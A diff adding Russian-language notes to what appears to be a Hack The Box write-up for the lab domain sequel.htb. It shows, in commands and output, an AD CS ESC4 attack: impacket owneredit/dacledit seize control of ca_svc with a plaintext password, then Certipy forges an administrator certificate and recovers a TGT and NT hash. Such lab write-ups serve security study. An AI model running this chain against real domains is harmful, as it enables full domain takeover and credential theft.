@@ -578,6 +578,182 @@ whenChanged                          : 2/12/2025 11:48:08 AM
 whenCreated                          : 6/8/2024 9:55:45 AM
 ```
 
-Команда `Get-ADUser -Identity ryan -Properties *` используется в **PowerShell** для получения информации о пользователе из **Active Directory**
+* Команда `Get-ADUser -Identity ryan -Properties *` используется в **PowerShell** для получения информации о пользователе из **Active Directory** *
 
+В данной документации, мы будем проходить эту машину через **shadow credentials**
 
+```
+Hexada@hexada ~/app/pentesting-tools/impacket/examples$ python3 owneredit.py -action write -new-owner ryan -target ca_svc 'escape.two.htb/ryan:WqSZAF6CysDQbGb3'                    master 
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Current owner information below
+[*] - SID: S-1-5-21-548670397-972687484-3496335370-512
+[*] - sAMAccountName: Domain Admins
+[*] - distinguishedName: CN=Domain Admins,CN=Users,DC=sequel,DC=htb
+[*] OwnerSid modified successfully!
+```
+
+```
+Hexada@hexada ~/app/pentesting-tools/impacket/examples$ python3 dacledit.py -action 'write' -rights 'FullControl' -principal 'ryan' -target 'ca_svc' 'escape.two.htb'/'ryan':'WqSZAF6CysDQbGb3'        
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] DACL backed up to dacledit-20250307-173659.bak
+[*] DACL modified successfully!
+```
+
+```
+(venv) Hexada@hexada ~/app/pentesting-tools/Certipy/certipy$ certipy find -u ca_svc@escape.two.htb -hashes '3b181b914e7a9d5508ea1e20bc2b7fce' -dc-ip 10.10.11.51 -vulnerable -stdout 
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[*] Finding certificate templates
+[*] Found 34 certificate templates
+[*] Finding certificate authorities
+[*] Found 1 certificate authority
+[*] Found 12 enabled certificate templates
+[*] Trying to get CA configuration for 'sequel-DC01-CA' via CSRA
+[!] Got error while trying to get CA configuration for 'sequel-DC01-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
+[*] Trying to get CA configuration for 'sequel-DC01-CA' via RRP
+[!] Failed to connect to remote registry. Service should be starting now. Trying again...
+[*] Got CA configuration for 'sequel-DC01-CA'
+[*] Enumeration output:
+Certificate Authorities
+  0
+    CA Name                             : sequel-DC01-CA
+    DNS Name                            : DC01.sequel.htb
+    Certificate Subject                 : CN=sequel-DC01-CA, DC=sequel, DC=htb
+    Certificate Serial Number           : 152DBD2D8E9C079742C0F3BFF2A211D3
+    Certificate Validity Start          : 2024-06-08 16:50:40+00:00
+    Certificate Validity End            : 2124-06-08 17:00:40+00:00
+    Web Enrollment                      : Disabled
+    User Specified SAN                  : Disabled
+    Request Disposition                 : Issue
+    Enforce Encryption for Requests     : Enabled
+    Permissions
+      Owner                             : SEQUEL.HTB\Administrators
+      Access Rights
+        ManageCertificates              : SEQUEL.HTB\Administrators
+                                          SEQUEL.HTB\Domain Admins
+                                          SEQUEL.HTB\Enterprise Admins
+        ManageCa                        : SEQUEL.HTB\Administrators
+                                          SEQUEL.HTB\Domain Admins
+                                          SEQUEL.HTB\Enterprise Admins
+        Enroll                          : SEQUEL.HTB\Authenticated Users
+Certificate Templates
+  0
+    Template Name                       : DunderMifflinAuthentication
+    Display Name                        : Dunder Mifflin Authentication
+    Certificate Authorities             : sequel-DC01-CA
+    Enabled                             : True
+    Client Authentication               : True
+    Enrollment Agent                    : False
+    Any Purpose                         : False
+    Enrollee Supplies Subject           : False
+    Certificate Name Flag               : SubjectRequireCommonName
+                                          SubjectAltRequireDns
+    Enrollment Flag                     : AutoEnrollment
+                                          PublishToDs
+    Private Key Flag                    : 16842752
+    Extended Key Usage                  : Client Authentication
+                                          Server Authentication
+    Requires Manager Approval           : False
+    Requires Key Archival               : False
+    Authorized Signatures Required      : 0
+    Validity Period                     : 1000 years
+    Renewal Period                      : 6 weeks
+    Minimum RSA Key Length              : 2048
+    Permissions
+      Enrollment Permissions
+        Enrollment Rights               : SEQUEL.HTB\Domain Admins
+                                          SEQUEL.HTB\Enterprise Admins
+      Object Control Permissions
+        Owner                           : SEQUEL.HTB\Enterprise Admins
+        Full Control Principals         : SEQUEL.HTB\Cert Publishers
+        Write Owner Principals          : SEQUEL.HTB\Domain Admins
+                                          SEQUEL.HTB\Enterprise Admins
+                                          SEQUEL.HTB\Administrator
+                                          SEQUEL.HTB\Cert Publishers
+        Write Dacl Principals           : SEQUEL.HTB\Domain Admins
+                                          SEQUEL.HTB\Enterprise Admins
+                                          SEQUEL.HTB\Administrator
+                                          SEQUEL.HTB\Cert Publishers
+        Write Property Principals       : SEQUEL.HTB\Domain Admins
+                                          SEQUEL.HTB\Enterprise Admins
+                                          SEQUEL.HTB\Administrator
+                                          SEQUEL.HTB\Cert Publishers
+    [!] Vulnerabilities
+      ESC4                              : 'SEQUEL.HTB\\Cert Publishers' has dangerous permissions
+```
+
+```
+`Hexada@hexada /etc$ cat hosts                                                                                                                                                              
+# Static table lookup for hostnames.
+# See hosts(5) for details.
+
+127.0.0.1       localhost
+::1             localhost
+127.0.0.1       hexada.localdomain    hexada
+192.168.0.101   cyberia
+10.10.11.51     sequel.htb
+```
+
+```
+*Evil-WinRM* PS C:\Users\ryan\Documents> ipconfig /all
+
+Windows IP Configuration
+
+   Host Name . . . . . . . . . . . . : DC01
+   Primary Dns Suffix  . . . . . . . : sequel.htb
+   Node Type . . . . . . . . . . . . : Hybrid
+   IP Routing Enabled. . . . . . . . : No
+   WINS Proxy Enabled. . . . . . . . : No
+   DNS Suffix Search List. . . . . . : sequel.htb
+
+Ethernet adapter Ethernet0 2:
+
+   Connection-specific DNS Suffix  . :
+   Description . . . . . . . . . . . : vmxnet3 Ethernet Adapter
+   Physical Address. . . . . . . . . : 00-50-56-94-AF-E0
+   DHCP Enabled. . . . . . . . . . . : No
+   Autoconfiguration Enabled . . . . : Yes
+   IPv4 Address. . . . . . . . . . . : 10.10.11.51(Preferred)
+   Subnet Mask . . . . . . . . . . . : 255.255.254.0
+   Default Gateway . . . . . . . . . : 10.10.10.2
+   DNS Servers . . . . . . . . . . . : 127.0.0.1
+   NetBIOS over Tcpip. . . . . . . . : Enabled
+```
+
+```
+(venv) Hexada@hexada ~/app/pentesting-tools/Certipy/certipy$ certipy req -u ca_svc -hashes '3b181b914e7a9d5508ea1e20bc2b7fce' -ca sequel-DC01-CA -target escape.two.htb -dc-ip 10.10.11.51 -template DunderMifflinAuthentication -upn administrator@escape.two.htb -ns 10.10.11.51 -dns 10.10.11.51 -debug
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[+] Trying to resolve 'escape.two.htb' at '10.10.11.51'
+[+] Generating RSA key
+[*] Requesting certificate via RPC
+[+] Trying to connect to endpoint: ncacn_np:10.10.11.51[\pipe\cert]
+[+] Connected to endpoint: ncacn_np:10.10.11.51[\pipe\cert]
+[*] Successfully requested certificate
+[*] Request ID is 17
+[*] Got certificate with multiple identifications
+    UPN: 'administrator@escape.two.htb'
+    DNS Host Name: '10.10.11.51'
+[*] Certificate has no object SID
+[*] Saved certificate and private key to 'administrator_10.pfx'
+```
+
+```
+(venv) Hexada@hexada ~/app/pentesting-tools/Certipy/certipy$ certipy auth -pfx administrator_10.pfx -domain sequel.htb -debug                                                        ✭main 
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[*] Found multiple identifications in certificate
+[*] Please select one:
+    [0] UPN: 'administrator@sequel.htb'
+    [1] DNS Host Name: '10.10.11.51'
+> 0
+[+] Trying to resolve 'sequel.htb' at '192.168.0.1'
+[*] Using principal: administrator@sequel.htb
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saved credential cache to 'administrator.ccache'
+[*] Trying to retrieve NT hash for 'administrator'
+[*] Got hash for 'administrator@sequel.htb': aad3b4********:7a8d4e********
+```
